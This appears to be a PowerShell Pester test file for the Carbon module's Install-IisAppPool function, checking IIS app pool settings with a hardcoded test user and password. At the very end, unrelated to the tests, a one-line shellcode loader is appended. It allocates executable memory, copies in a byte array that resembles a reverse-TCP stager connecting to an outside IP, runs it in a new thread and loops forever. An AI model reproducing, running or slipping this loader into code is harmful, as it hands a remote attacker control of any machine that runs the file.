











$appPoolName = 'CarbonInstallIisAppPool'
$username = 'CarbonInstallIisAppP'
$password = '!QAZ2wsx8fk3'

& (Join-Path -Path $PSScriptRoot 'Initialize-CarbonTest.ps1' -Resolve)

Install-User -Credential (New-Credential -Username $username -Password $password) -Description 'User for testing Carbon''s Install-IisAppPool function.'

function Assert-AppPoolExists
{
    $exists = Test-IisAppPool -Name $appPoolname
    $exists | Should Be $true
}
    
function Assert-ManagedRuntimeVersion($Version)
{
    $apppool = Get-IisAppPool -Name $appPoolName
    $apppool.ManagedRuntimeVersion | Should Be $Version
}
    
function Assert-ManagedPipelineMode($expectedMode)
{
    $apppool = Get-IisAppPool -Name $appPoolName
    $apppool.ManagedPipelineMode | Should Be $expectedMode
}
    
function Assert-IdentityType($expectedIdentityType)
{
    $appPool = Get-IisAppPool -Name $appPoolName
    $appPool.ProcessModel.IdentityType | Should Be $expectedIdentityType
}
    
function Assert-IdleTimeout($expectedIdleTimeout)
{
    $appPool = Get-IisAppPool -Name $appPoolName
    $expectedIdleTimeoutTimespan = New-TimeSpan -minutes $expectedIdleTimeout
    $appPool.ProcessModel.IdleTimeout | Should Be $expectedIdleTimeoutTimespan
}
    
function Assert-Identity($expectedUsername, $expectedPassword)
{
    $appPool = Get-IisAppPool -Name $appPoolName
    $appPool.ProcessModel.UserName | Should Be $expectedUsername
    $appPool.ProcessModel.Password | Should Be $expectedPassword
}
    
function Assert-AppPool32BitEnabled([bool]$expected32BitEnabled)
{
    $appPool = Get-IisAppPool -Name $appPoolName
    $appPool.Enable32BitAppOnWin64 | Should Be $expected32BitEnabled
}
    
function Assert-AppPool
{
    param(
        [Parameter(Position=0)]
        $AppPool,
    
        $ManangedRuntimeVersion = 'v4.0',
    
        [Switch]
        $ClassicPipelineMode,
    
        $IdentityType = (Get-IISDefaultAppPoolIdentity),
    
        [Switch]
        $Enable32Bit,
    
        [TimeSpan]
        $IdleTimeout = (New-TimeSpan -Seconds 0)
    )
    
    Set-StrictMode -Version 'Latest'
    
    Assert-AppPoolExists
    
    if( -not $AppPool )
    {
        $AppPool = Get-IisAppPool -Name $appPoolName
    }
    
    $AppPool.ManagedRuntimeVersion | Should Be $ManangedRuntimeVersion
    $pipelineMode = 'Integrated'
    if( $ClassicPipelineMode )
    {
        $pipelineMode = 'Classic'
    }
    $AppPool.ManagedPipelineMode | Should Be $pipelineMode
    $AppPool.ProcessModel.IdentityType | Should Be $IdentityType
    $AppPool.Enable32BitAppOnWin64 | Should Be ([bool]$Enable32Bit)
    $AppPool.ProcessModel.IdleTimeout | Should Be $IdleTimeout
    
    $MAX_TRIES = 20
    for ( $idx = 0; $idx -lt $MAX_TRIES; ++$idx )
    {
        $AppPool = Get-IisAppPool -Name $appPoolName
        $AppPool | Should Not BeNullOrEmpty
        if( $AppPool.State )
        {
            $AppPool.State | Should Be ([Microsoft.Web.Administration.ObjectState]::Started)
            break
        }
        Start-Sleep -Milliseconds 1000
    }
}

function Start-Test
{
    Uninstall-IisAppPool -Name $appPoolName
    Revoke-Privilege -Identity $username -Privilege SeBatchLogonRight
}
    
Describe 'Install-IisAppPool when running no manage code' {
    Start-Test

    Install-IisAppPool -Name $appPoolName -ManagedRuntimeVersion ''
    It 'should set managed runtime to nothing' {
        Assert-ManagedRuntimeVersion -Version ''
    }
}
    
Describe 'Install-IisAppPool' {
    BeforeEach {
        Start-Test
    }
    
    function Get-IISDefaultAppPoolIdentity
    {
        $iisVersion = Get-IISVersion
        if( $iisVersion -eq '7.0' )
        {
            return 'NetworkService'
        }
        return 'ApplicationPoolIdentity'
    }
    
    It 'should create new app pool' {
        $result = Install-IisAppPool -Name $appPoolName -PassThru
        $result | Should Not BeNullOrEmpty
        Assert-AppPool $result
    }
    
    It 'should create new app pool but not r eturn object' {
        $result = Install-IisAppPool -Name $appPoolName
        $result | Should BeNullOrEmpty
        $appPool = Get-IisAppPool -Name $appPoolName
        $appPool | Should Not BeNullOrEmpty
        Assert-AppPool $appPool
        
    }
    
    It 'should set managed runtime version' {
        $result = Install-IisAppPool -Name $appPoolName -ManagedRuntimeVersion 'v2.0'
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-ManagedRuntimeVersion 'v2.0'
    }
    
    It 'should set managed pipeline mode' {
        $result = Install-IisAppPool -Name $appPoolName -ClassicPipelineMode
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-ManagedPipelineMode 'Classic'
    }
    
    It 'should set identity as service account' {
        $result = Install-IisAppPool -Name $appPoolName -ServiceAccount 'NetworkService'
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-IdentityType 'NetworkService'
    }
    
    It 'should set identity as specific user' {
        $warnings = @()
        $result = Install-IisAppPool -Name $appPoolName -UserName $username -Password $password -WarningVariable 'warnings'
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-Identity $username $password
        Assert-IdentityType 'SpecificUser'
        Get-Privilege $username | Where-Object { $_ -eq 'SeBatchLogonRight' } | Should Not BeNullOrEmpty
        $warnings.Count | Should Be 1
        ($warnings[0] -like '*obsolete*') | Should Be $true
    }
    
    It 'should set identity with credential' {
        $credential = New-Credential -UserName $username -Password $password
        $credential | Should Not BeNullOrEmpty
        $result = Install-IisAppPool -Name $appPoolName -Credential $credential
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-Identity $credential.UserName $credential.GetNetworkCredential().Password
        Assert-IdentityType 'Specificuser'
        Get-Privilege $username | Where-Object { $_ -eq 'SeBatchLogonRight' } | Should Not BeNullOrEmpty
    }
    
    It 'should set idle timeout' {
        $result = Install-IisAppPool -Name $appPoolName -IdleTimeout 55
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-Idletimeout 55
    }
    
    It 'should enable32bit apps' {
        $result = Install-IisAppPool -Name $appPoolName -Enable32BitApps
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-AppPool32BitEnabled $true
    }
    
    It 'should handle app pool that exists' {
        $result = Install-IisAppPool -Name $appPoolName
        $result | Should BeNullOrEmpty
        $result = Install-IisAppPool -Name $appPoolName
        $result | Should BeNullOrEmpty
    }
    
    It 'should change settings on existing app pool' {
        $result = Install-IisAppPool -Name $appPoolName
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-ManagedRuntimeVersion 'v4.0'
        Assert-ManagedPipelineMode 'Integrated'
        Assert-IdentityType (Get-IISDefaultAppPoolIdentity)
    
        Assert-AppPool32BitEnabled $false
    
        $result = Install-IisAppPool -Name $appPoolName -ManagedRuntimeVersion 'v2.0' -ClassicPipeline -ServiceAccount 'LocalSystem' -Enable32BitApps
        $result | Should BeNullOrEmpty
        Assert-AppPoolExists
        Assert-ManagedRuntimeVersion 'v2.0'
        Assert-ManagedPipelineMode 'Classic'
        Assert-IdentityType 'LocalSystem'
        Assert-AppPool32BitEnabled $true
    
    }
    
    It 'should accept secure string for app pool password' {
        $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
        Install-IisAppPool -Name $appPoolName -Username $username -Password $securePassword
        Assert-Identity $username $password
    }
    
    It 'should convert32 bit app poolto64 bit' {
        Install-IisAppPool -Name $appPoolName -ServiceAccount NetworkService -Enable32BitApps
        Assert-AppPool32BitEnabled $true
        Install-IisAppPool -Name $appPoolName -ServiceAccount NetworkService
        Assert-AppPool32BitEnabled $false    
    }
    
    It 'should switch to app pool identity if service account not given' {
        Install-IisAppPool -Name $appPoolName -ServiceAccount NetworkService
        Assert-IdentityType 'NetworkService'
        Install-IisAppPool -Name $appPoolName
        Assert-IdentityType (Get-IISDefaultAppPoolIdentity)
    }
    
    It 'should start stopped app pool' {
        Install-IisAppPool -Name $appPoolName 
        $appPool = Get-IisAppPool -Name $appPoolName
        $appPool | Should Not BeNullOrEmpty
        if( $appPool.state -ne [Microsoft.Web.Administration.ObjectState]::Stopped )
        { 
            Start-Sleep -Seconds 1
            $appPool.Stop()
        }
        
        Install-IisAppPool -Name $appPoolName
        $appPool = Get-IisAppPool -Name $appPoolName
        $appPool.state | Should Be ([Microsoft.Web.Administration.ObjectState]::Started)
    }
    
    It 'should fail if identity does not exist' {
        $error.Clear()
        Install-IisAppPool -Name $appPoolName -Username 'IDoNotExist' -Password 'blahblah' -ErrorAction SilentlyContinue
        (Test-IisAppPool -Name $appPoolName) | Should Be $true
        ($error.Count -ge 2) | Should Be $true
    }
    
    
}

Start-Test

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x31,0x31,0xc5,0x58,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

